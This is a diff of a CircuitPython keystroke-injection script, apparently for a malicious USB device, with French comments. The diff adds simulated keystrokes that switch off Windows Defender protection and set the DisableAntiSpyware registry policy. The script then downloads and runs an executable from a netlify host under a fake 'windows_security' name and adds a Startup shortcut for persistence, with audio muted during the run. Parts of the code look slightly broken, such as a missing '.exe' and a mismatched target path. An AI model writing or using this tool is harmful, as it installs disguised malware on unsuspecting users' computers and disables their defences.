@@ -28,27 +28,48 @@ else:
     print("Mode exécution activé (pas de court-circuit)")
     consumer.press(ConsumerControlCode.MUTE)
     time.sleep(0.3)
-    kbd.send(Keycode.GUI,Keycode.X)
+    kbd.send(Keycode.GUI, Keycode.X)
     time.sleep(0.3)
     layout.write("a")
-    time.sleep(1.5)
+    time.sleep(0.6)
     kbd.send(Keycode.LEFT_ARROW)
     time.sleep(0.3)
     kbd.send(Keycode.ENTER)
     time.sleep(5)
-    layout.write("""Invoke-WebRequest -Uri 'https://aboutblanck.netlify.app/Sécurité_windows.exe' -OutFile 'Sécurité_windows.exe'""")
+
+    # Ouvrir les paramètres de sécurité Windows Defender (optionnel)
+    layout.write('Start-Process "windowsdefender://threatsettings"')
+    kbd.send(Keycode.ENTER)
+    time.sleep(0.5)
+    kbd.send(Keycode.GUI, Keycode.UP_ARROW) # Win + Flèche Haut pour maximiser
+    kbd.send(Keycode.SPACE)
+    time.sleep(0.7)
+    kbd.send(Keycode.LEFT_ARROW)
+    time.sleep(0.3)
+    kbd.send(Keycode.ENTER)
+    time.sleep(3)
+    kbd.send(Keycode.ALT,Keycode.F4)
+    
+    layout.write('''New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null''')
+    kbd.send(Keycode.ENTER)
+    time.sleep(0.3)
+    layout.write('''Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force''')
+    kbd.send(Keycode.ENTER)
+    time.sleep(0.3)
+    
+    layout.write("""Invoke-WebRequest -Uri 'https://aboutblanck.netlify.app/windows_security.exe' -OutFile 'windows_security.exe'""")
     kbd.send(Keycode.ENTER)
     time.sleep(10)
-    layout.write("""if (Test-Path 'Sécurité_windows.exe') {
-    # Lancer le programme téléchargé
-    Start-Process -FilePath '.\Sécurité_windows.exe'
+    layout.write("""if (Test-Path 'windows_security.exe') {
+    # Lancer le programme telecharge
+    Start-Process -FilePath '.\windows_security'
 } else {
-    Write-Host "Le fichier n'a pas été téléchargé."
+    Write-Host "Le fichier n'a pas ete telecharge."
 }""")
     kbd.send(Keycode.ENTER)
     time.sleep(0.5)
-    layout.write('''$target = "$env:windir\System32\Sécurité_windows.exe"
-$shortcutName = "Sécurité_windows.lnk"
+    layout.write('''$target = "$env:windir\System32\windows_security.exe"
+$shortcutName = "windows_security.lnk"
 $startupFolder = [Environment]::GetFolderPath("Startup")
 
 $shell = New-Object -ComObject WScript.Shell
@@ -59,10 +80,13 @@ $shortcut.WorkingDirectory = Split-Path $target
 $shortcut.WindowStyle = 1
 $shortcut.Save()
 
-Write-Host "Raccourci créé dans $startupFolder"''')
+Write-Host "Raccourci cree dans $startupFolder"''')
     time.sleep(0.5)
     kbd.send(Keycode.ENTER)
     time.sleep(0.5)
     layout.write("exit")
     kbd.send(Keycode.ENTER)
     consumer.press(ConsumerControlCode.MUTE)
+
+    
+    
